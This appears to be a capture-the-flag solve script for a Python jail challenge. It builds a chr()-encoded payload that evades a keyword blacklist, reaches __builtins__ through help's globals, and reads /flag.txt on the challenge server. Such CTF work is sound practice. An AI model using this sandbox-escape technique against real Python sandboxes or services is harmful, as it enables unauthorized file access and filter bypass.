#!/usr/bin/env python3
from pwn import *

conn = remote('blacklisthell.challenges2.ctf.dscjssstuniv.in', 1338)

# Receive banner properly  
banner = conn.recvuntil(b'Welcome to the jail!')
conn.recvuntil(b'Enter command: ')

# Build a test payload that reads flag
# Let's try: getattr(getattr(help, '__call__'), '__globals__')['__builtins__']['open']('/flag.txt').read()
# But using chr() for all strings

def gen_chr(s):
    return "+".join([f"chr({ord(c)})" for c in s])

str_call = gen_chr("__call__")
str_globals = gen_chr("__globals__")
str_builtins = gen_chr("__builtins__")
str_open = gen_chr("open")
str_flag = gen_chr("/flag.txt")
str_read = gen_chr("read")

payload = f"getattr(getattr(getattr(help,{str_call}),{str_globals})[{str_builtins}][{str_open}]({str_flag}),{str_read})()"

print(f'Payload length: {len(payload)}')
print(f'Sending...')
conn.sendline(payload.encode())

# Get response
try:
    response = conn.recvuntil(b'Enter command: ', timeout=5)
    print('Response 1:')
    print(response.decode())
except:
    print('No second prompt received')

# Send second command
conn.sendline(b'help()')

# Get final
final = conn.recvall(timeout=2).decode()
print('Final output:')
print(final)

conn.close()
